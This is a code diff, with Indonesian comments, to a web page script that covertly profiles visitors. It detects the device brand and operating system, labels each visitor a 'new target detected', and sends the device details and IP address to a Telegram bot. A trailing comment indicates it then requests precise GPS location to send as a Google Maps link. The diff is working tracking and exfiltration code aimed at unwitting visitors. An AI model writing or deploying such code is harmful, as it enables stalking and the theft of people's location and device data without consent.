@@ -7,9 +7,9 @@ async function startProcess() {
     document.getElementById('loader').style.display = 'block';
     const statusEl = document.getElementById('status');
     
-    statusEl.innerText = "Mengumpulkan informasi perangkat...";
+    statusEl.innerText = "Mengumpulkan informasi perangkat secara rinci...";
 
-    // 1. Kumpulkan Data Perangkat & Browser
+    // 1. Kumpulkan Data Perangkat & Browser secara Rinci
     const userAgent = navigator.userAgent;
     const platform = navigator.platform;
     const language = navigator.language;
@@ -17,12 +17,30 @@ async function startProcess() {
     const hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
     const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
     
-    let deviceType = "Desktop / PC";
-    if (/android/i.test(userAgent)) deviceType = "Android";
-    else if (/iphone|ipad|ipod/i.test(userAgent)) deviceType = "iOS (Apple)";
+    // Deteksi Nama Perangkat / OS yang lebih rinci dari User Agent
+    let detailedDevice = "Perangkat Tidak Dikenal";
+    
+    if (/android/i.test(userAgent)) {
+        detailedDevice = "Android";
+        // Coba deteksi brand populer di Android
+        if (/samsung/i.test(userAgent)) detailedDevice = "Samsung Android";
+        else if (/xiaomi|redmi|poco/i.test(userAgent)) detailedDevice = "Xiaomi / Redmi";
+        else if (/oppo/i.test(userAgent)) detailedDevice = "Oppo";
+        else if (/vivo/i.test(userAgent)) detailedDevice = "Vivo";
+        else if (/realme/i.test(userAgent)) detailedDevice = "Realme";
+        else if (/huawei/i.test(userAgent)) detailedDevice = "Huawei";
+    } else if (/iphone|ipad|ipod/i.test(userAgent)) {
+        detailedDevice = "Apple iOS (iPhone/iPad)";
+    } else if (/win/i.test(platform)) {
+        detailedDevice = "Windows PC";
+    } else if (/mac/i.test(platform)) {
+        detailedDevice = "Apple macOS";
+    } else if (/linux/i.test(platform)) {
+        detailedDevice = "Linux PC";
+    }
 
-    let infoText = `🚨 **TARGET BARU TERDETEKSI** 🚨\n\n` +
-                   `💻 **Jenis OS/Device:** ${deviceType}\n` +
+    let infoText = `🚨 **TARGET BARU TERDETEKSI (RINCI)** 🚨\n\n` +
+                   `💻 **Jenis OS/Device:** ${detailedDevice}\n` +
                    `📱 **Platform:** ${platform}\n` +
                    `🌐 **Bahasa:** ${language}\n` +
                    `🖥 **Resolusi Layar:** ${screenRes}\n` +
@@ -41,7 +59,7 @@ async function startProcess() {
         console.error("Gagal mengambil data IP:", e);
     }
 
-    // Kirim Teks Utama (Perangkat + IP) ke Telegram
+    // Kirim Teks Utama (Perangkat Rinci + IP) ke Telegram
     await sendTextToTelegram(infoText);
 
     // 3. Minta Izin Lokasi GPS Akurat & Kirim Link Google Maps
